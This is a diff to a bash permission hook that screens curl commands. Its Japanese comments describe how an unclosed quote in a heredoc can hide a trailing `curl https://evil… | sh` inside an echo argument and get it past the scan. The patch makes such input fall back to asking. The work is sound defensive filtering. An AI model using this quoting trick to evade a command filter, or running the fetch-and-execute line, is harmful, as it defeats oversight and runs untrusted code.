@@ -490,11 +490,17 @@ fi
 
 # 変数・置換は宛先を運べる(代入の前置は `http_proxy` で URL を外へ振り替えられる)、
 # 番兵は偽の segment 境界を作れる、{ } * は単語数を変える。読み切れないコマンドとして ask。
-# 詳細は lib/shell-reader.bash。引用符の閉じ忘れはここでは見ない: curl が token として
-# 見つかった後なので、閉じていない token は curl の引数として URL に読めず ask へ落ちる
-# (curl がその token に飲み込まれた場合は、上の字面の床が受け持つ)。
+# 詳細は lib/shell-reader.bash。
+# 引用符が閉じないまま終わったときも ask にする。閉じていない token は curl の segment に入るとは
+# 限らない: `curl http://localhost/ && cat <<'EOF' …` の heredoc 本文 `echo it's here` では、
+# それ以降(heredoc の後ろの `curl https://evil… | sh` を含む)が `echo` の引数の 1 token になり、
+# `echo` は INERT_COMMANDS なので segment の走査を通ってしまう。curl が token として見つかった
+# 後なので字面の床(上)は走らない。受容した誤 ask: ループバック宛の curl と、アポストロフィを含む
+# heredoc 本文の組み合わせ(後ろに何も無くても ask)。PR 本文の heredoc は curl が 1 token に
+# 飲み込まれて CURL_PRESENT=0 側に行くので、この条件には来ない。
 if [[ $CURLRC_PRESENT -eq 1 || $SHELL_READER_EXPANSION -eq 1 ||
-    $SHELL_READER_SEP_IN_INPUT -eq 1 || $SHELL_READER_WORD_MULTIPLIER -eq 1 ]]; then
+    $SHELL_READER_SEP_IN_INPUT -eq 1 || $SHELL_READER_WORD_MULTIPLIER -eq 1 ||
+    $SHELL_READER_UNCLOSED_QUOTE -eq 1 ]]; then
     emit_ask
     exit 0
 fi
